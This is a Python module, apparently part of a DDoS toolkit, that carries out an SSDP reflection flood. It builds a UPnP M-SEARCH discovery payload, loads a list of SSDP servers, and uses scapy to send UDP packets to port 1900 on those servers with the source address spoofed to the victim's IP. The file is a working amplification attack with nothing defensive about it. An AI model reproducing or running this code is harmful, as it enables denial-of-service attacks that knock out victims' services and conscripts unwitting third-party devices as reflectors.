import random
from scapy.all import *
from scapy.layers.inet import *
from rich.console import Console
from bin.addons.utils import __path

# Define styled print
print = Console().print
red = "red3"
green = "green1"
yellow = "yellow1"
blue = "dark_slate_gray2"


payload = [
    "M-SEARCH * HTTP/1.1",
    "Host:239.255.255.250:1900",
    "ST:upnp:rootdevice",
    'Man:"ssdp:discover"',
    "MX:1",
    "",
]
sendpayload = "\r\n".join(payload)

with open(__path("bin", "config", "ssdp_servers.txt"), "r") as f:
    ssdp_servers = f.readlines()


def flood(target):
    src_port = random.randint(0, 65535)
    server = random.choice(ssdp_servers)
    server = server.replace("\n", "")
    try:
        send(
            IP(dst=server, src=target[0])
            / UDP(sport=src_port, dport=1900)
            / sendpayload,
            verbose=False,
        )
    except Exception as e:
        print(
            f"[{red}][✘] ERROR[/{red}] "
            + f"[{yellow}]While sending packget[/{yellow}]\n{e}"
        )
    else:
        print(
            f"[{green}][✔] SUCCESS[{green}] "
            + f"[{yellow}]Packget sent! send to:[/{yellow}] "
            + f"[{blue}]{server}"
        )
